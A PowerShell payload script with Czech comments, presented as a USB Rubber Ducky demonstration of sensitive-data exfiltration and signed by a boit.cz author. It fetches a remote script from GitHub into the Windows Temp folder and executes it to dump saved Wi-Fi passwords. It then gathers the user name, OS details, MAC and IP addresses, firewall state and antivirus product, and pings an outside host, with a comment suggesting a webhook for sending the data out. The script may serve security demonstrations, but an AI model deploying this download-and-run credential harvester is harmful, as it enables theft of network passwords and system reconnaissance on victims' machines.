# Testovaci script pro USB Rubber Ducky ktery dokazuje moznosti exfiltrace citlivych dat
# Nejprve se stahne PS z netu, ten se spustit, sesbira info a pak si pingne wven jako dukaz konektivity. Stejne by sla data poslat ven treba pres webhook.

# Nastaveni URL skriptu, ktery chcete stahnout a spustit
$scriptUrl = "https://raw.githubusercontent.com/spajk-cz/omg/main/ducky_WLAN_PASS.ps1"

# Nastaveni cesty, kam chcete skript ulozit
$scriptPath = "C:\Windows\Temp\script.ps1"

# Stazeni skriptu
Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath

Write-Host "`n" # Prazdny radek

Write-Host "Ulozene Wi-Fi site a jejich hesla:"

Write-Host "`n" # Prazdny radek

# Kontrola, zda byl skript uspesne stazen
if (Test-Path $scriptPath) {
    # Spusteni stazeneho skriptu
    . $scriptPath
} else {
    Write-Host "Skript se nepodarilo stahnout."
}

Write-Host "`n" # Prazdny radek

# Ziskani jmena aktualne prihlaseneho uzivatele
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Write-Host "Prihlaseny uzivatel: $currentUser"

Write-Host "`n" # Prazdny radek

# Zjisteni verze OS
$osInfo = Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsHardwareAbstractionLayer
Write-Host "Informace o Windows 11:" $osInfo

Write-Host "`n" # Prazdny radek

# Zjisteni MAC adresy aktivniho sitoveho adapteru
$macAddress = Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -ExpandProperty MacAddress
Write-Host "MAC adresa: $macAddress"

Write-Host "`n" # Prazdny radek

# Zjisteni lokalni IP adresy
$localIP = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.AddressState -eq "Preferred" -and $_.InterfaceAlias -notlike "Loopback*" } | Select-Object -ExpandProperty IPAddress
Write-Host "Lokalni IP adresa: $localIP"

Write-Host "`n" # Prazdny radek

# Zjisteni verejne IP adresy
$publicIP = Invoke-RestMethod -Uri "http://icanhazip.com"
Write-Host "Verejna IP adresa: $publicIP"

Write-Host "`n" # Prazdny radek

# Zjisteni statusu firewallu
$firewallStatus = Get-NetFirewallProfile
Write-Host "Stav firewallu:"
foreach ($profile in $firewallStatus) {
    Write-Host "Profil: $($profile.Name), Povoleno: $($profile.Enabled)"
}
Write-Host "`n" # Prazdny radek


Write-Host "`n" # Prazdny radek

# Zjisteni nazvu nainstalovaneho antiviroveho programu
$antivirusName = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName
Write-Host "Antivirus: $antivirusName"

Write-Host "`n" # Prazdny radek

# Ping domu na BOIT.cz
$pingResult = Test-Connection -ComputerName "boit.cz" -Count 1 -ErrorAction SilentlyContinue
if ($pingResult) {
    Write-Host "Ping na boit.cz: Cas odezvy - $($pingResult.ResponseTime)ms"
} else {
    Write-Host "Ping na boit.cz: Nebylo mozne dosahnout hostitele"
}

Write-Host "`n" # Prazdny radek

Write-Host -ForegroundColor DarkYellow "      ____   ____ _____ _______ "       
Write-Host -ForegroundColor DarkYellow "     |  _ \ / __ \_   _|__   __| "      
Write-Host -ForegroundColor DarkYellow "     | |_) | |  | || |    | |  ___ ____"
Write-Host -ForegroundColor DarkYellow "     |  _ <| |  | || |    | | / __|_  /"
Write-Host -ForegroundColor DarkYellow "     | |_) | |__| || |_   | || (__ / / "
Write-Host -ForegroundColor DarkYellow "     |____/ \____/_____|  |_(_)___/___|"

Write-Host "`n" # Prazdny radek
Write-Host "S pozdravem Spajk z BOIT.cz" 

Write-Host "`n" # Prazdny radek
